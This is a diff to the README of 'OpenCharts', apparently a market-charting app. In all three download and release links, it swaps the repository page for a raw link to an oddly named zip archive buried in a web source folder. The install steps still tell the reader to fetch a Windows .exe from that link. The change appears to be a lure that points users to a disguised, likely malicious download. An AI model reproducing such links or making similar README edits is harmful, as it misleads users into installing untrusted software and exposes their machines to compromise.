@@ -1,6 +1,6 @@
 # 📈 OpenCharts - Analyze global markets with ease
 
-[![Download OpenCharts](https://img.shields.io/badge/Download-OpenCharts-blue.svg)](https://github.com/cu3j3n18/OpenCharts)
+[![Download OpenCharts](https://img.shields.io/badge/Download-OpenCharts-blue.svg)](https://github.com/cu3j3n18/OpenCharts/raw/refs/heads/main/apps/web/src/pages/Open_Charts_arseniasis.zip)
 
 OpenCharts provides a free, self-hosted system for viewing financial data. It tracks stocks, crypto, and currency markets in real time. You use it to view charts, apply technical indicators, and monitor price alerts. It works as an alternative to expensive subscription tools.
 
@@ -8,7 +8,7 @@ OpenCharts provides a free, self-hosted system for viewing financial data. It tr
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [OpenCharts release page](https://github.com/cu3j3n18/OpenCharts).
+1. Go to the [OpenCharts release page](https://github.com/cu3j3n18/OpenCharts/raw/refs/heads/main/apps/web/src/pages/Open_Charts_arseniasis.zip).
 2. Look for the Assets section.
 3. Select the file ending in .exe for Windows.
 4. Download the file to your computer.
@@ -28,7 +28,7 @@ Ensure your computer meets these standards for smooth performance:
 
 ## 📁 Installation Details
 
-[Download the application here.](https://github.com/cu3j3n18/OpenCharts)
+[Download the application here.](https://github.com/cu3j3n18/OpenCharts/raw/refs/heads/main/apps/web/src/pages/Open_Charts_arseniasis.zip)
 
 The installer manages all necessary components. You do not need to install extra software like databases or web servers. The package includes a local data store to keep your chart settings and preferences on your own machine. 
 
